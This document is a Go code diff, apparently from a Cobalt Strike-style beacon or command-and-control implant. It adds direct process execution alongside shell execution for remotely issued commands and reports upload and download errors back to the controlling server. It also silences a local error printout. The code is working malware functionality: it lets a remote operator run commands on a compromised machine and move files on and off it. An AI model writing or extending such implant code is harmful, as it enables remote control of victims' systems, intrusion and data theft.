@@ -36,7 +36,7 @@ func main() {
 			resp := transports.PullCommand()
 			if resp != nil {
 				if err := processResponse(resp); err != nil {
-					fmt.Printf("!error processing response: %v\n", err)
+					// fmt.Printf("!error processing response: %v\n", err)
 				}
 			}
 			serviceDownload()
@@ -140,8 +140,23 @@ func processResponse(resp *http.Response) error {
 func executeCommand(cmdType uint32, taskID [8]byte, cmdBuf []byte) {
 	switch cmdType {
 	case commands.CMD_TYPE_SHELL:
-		shellPath, shellBuf := commands.ParseCommandShell(cmdBuf)
-		result := commands.Shell(shellPath, shellBuf)
+		rawPath, shellPath, shellBuf := commands.ParseCommandShell(cmdBuf)
+
+		var result []byte
+		var err error
+		if rawPath == "" {
+			// Run command: empty wire path means direct process execution (no shell)
+			result, err = commands.Run(string(shellBuf))
+		} else {
+			// Shell command: execute via shell interpreter
+			result, err = commands.Shell(shellPath, shellBuf)
+		}
+
+		if err != nil && len(result) == 0 {
+			// Process failed to start — send CALLBACK_ERROR
+			commands.ProcessErrorWithTaskID(err.Error(), taskID)
+			return
+		}
 
 		constants.NextJobNum++
 		jobNum := constants.NextJobNum
@@ -163,18 +178,23 @@ func executeCommand(cmdType uint32, taskID [8]byte, cmdBuf []byte) {
 	case commands.CMD_TYPE_UPLOAD_START:
 		filePath, fileData := commands.ParseCommandUpload(cmdBuf)
 		filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
-		commands.Upload(filePathStr, fileData)
+		if err := commands.Upload(filePathStr, fileData); err != nil {
+			commands.ProcessErrorWithTaskID(err.Error(), taskID)
+		}
 
 	case commands.CMD_TYPE_UPLOAD_LOOP:
 		filePath, fileData := commands.ParseCommandUpload(cmdBuf)
 		filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
-		commands.Upload(filePathStr, fileData)
+		if err := commands.Upload(filePathStr, fileData); err != nil {
+			commands.ProcessErrorWithTaskID(err.Error(), taskID)
+		}
 
 	case commands.CMD_TYPE_DOWNLOAD:
 		filePath := cmdBuf
 		strFilePath := strings.ReplaceAll(string(filePath), "\\", "/")
 		fileInfo, err := os.Stat(strFilePath)
 		if err != nil {
+			commands.ProcessErrorWithTaskID(err.Error(), taskID)
 			return
 		}
 		fileLen := int(fileInfo.Size())
@@ -189,6 +209,7 @@ func executeCommand(cmdType uint32, taskID [8]byte, cmdBuf []byte) {
 		// Open file and set up stateful download — chunks sent one per cycle
 		fileHandle, err := os.Open(strFilePath)
 		if err != nil {
+			commands.ProcessErrorWithTaskID(err.Error(), taskID)
 			return
 		}
 		activeDownload = &pendingDownload{
